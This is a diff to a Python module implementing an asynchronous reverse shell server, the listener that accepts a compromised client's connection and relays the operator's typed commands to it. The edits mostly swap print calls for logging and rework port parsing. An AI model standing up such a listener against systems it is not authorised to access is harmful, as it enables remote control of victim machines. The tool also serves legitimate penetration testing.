@@ -20,25 +20,29 @@
 ###################
 
 """
-    This module implement the ReverseShellServer.
+    This module implement a Asynchrone Reverse Shell Server.
 """
 
 import asyncore
+import logging
 
 __all__ = ["ReverseShellServer"]
 
 
 class ReverseShell(asyncore.dispatcher_with_send):
+
     """
     This class print informations send by the client and ask the 
     command to the user.
     """
 
     def handle_read(self):
+
         """
         This method print informations send by the client and 
         ask the command to the user.
         """
+
         data = self.recv(65535).decode()
         command = input(data)
         while not command:
@@ -47,9 +51,9 @@ class ReverseShell(asyncore.dispatcher_with_send):
 
 
 class ReverseShellServer(asyncore.dispatcher):
+
     """
-    This class implement a simple asynchronous TCP server 
-    to create the socket to communicate with the client.
+    This class implement a simple asynchronous TCP server.
     """
 
     def __init__(self, host, port):
@@ -60,15 +64,19 @@ class ReverseShellServer(asyncore.dispatcher):
         self.listen(100)
 
     def handle_accepted(self, sock, addr):
+
         """
-        This method call the ReverseShell.
+        This method call the ReverseShell class.
         """
-        print(f"{addr[0]}:{addr[1]} is connected...")
+
+        logging.warning(f"{addr[0]}:{addr[1]} is connected...")
         ReverseShell(sock)
 
 
 def main():
     from sys import argv
+
+    logging.basicConfig(format='%(asctime)s %(levelname)s : %(message)s')
 
     port = 45678
     host = ""
@@ -79,12 +87,13 @@ def main():
             host = arg.split("=")[1]
             argv_number += 1
         elif arg.startswith("--port=") or arg.startswith("-p="):
-            try:
-                port = int(arg.split("=")[1])
-            except ValueError:
-                print("ERROR : port must be an integer.")
-            else:
+            port = arg.split("=", 1)[1]
+            if port.isdigit():
+                port = int(port)
                 argv_number += 1
+            else:
+                logging.error("port must be an integer.")
+                
 
     if len(argv) - argv_number > 1:
         print(
@@ -93,11 +102,11 @@ def main():
         )
 
     ReverseShellServer(host, port)
-    print(f"Server is running on tcp://{host}:{port}")
+    logging.warning(f"Server is running on tcp://{host}:{port}")
     try:
         asyncore.loop()
     except KeyboardInterrupt:
-        print("Server is not running...")
+        logging.warning("Server is not running...")
 
 
 if __name__ == "__main__":
